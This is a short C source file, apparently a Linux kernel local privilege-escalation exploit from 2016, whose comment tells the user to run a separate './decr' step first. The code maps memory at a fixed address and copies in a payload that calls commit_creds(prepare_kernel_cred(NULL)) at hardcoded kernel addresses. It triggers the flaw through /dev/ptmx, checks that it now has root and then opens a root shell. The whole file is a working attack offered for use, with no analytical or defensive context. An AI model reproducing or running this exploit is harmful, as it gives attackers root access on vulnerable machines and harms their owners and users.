/**
 * Run ./decr first!
 *
 * 23/04/2016
 * - vnik
 */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <assert.h>

#define MMAP_ADDR 0xff814e3000
#define MMAP_OFFSET 0xb0

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);
typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);

void __attribute__((regparm(3))) privesc() {
	commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;
	prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;
        commit_creds(prepare_kernel_cred((uint64_t)NULL));
}

int main() {
	void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);
	assert(payload == (void *)MMAP_ADDR);

	void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);

	memset(shellcode, 0, 0x300000);

	void *ret = memcpy(shellcode, &privesc, 0x300);
	assert(ret == shellcode);

	printf("[+] Escalating privs...\n");

	int fd = open("/dev/ptmx", O_RDWR);
	close(fd);

	assert(!getuid());

	printf("[+] We've got root!");

        return execl("/bin/bash", "-sh", NULL);
}
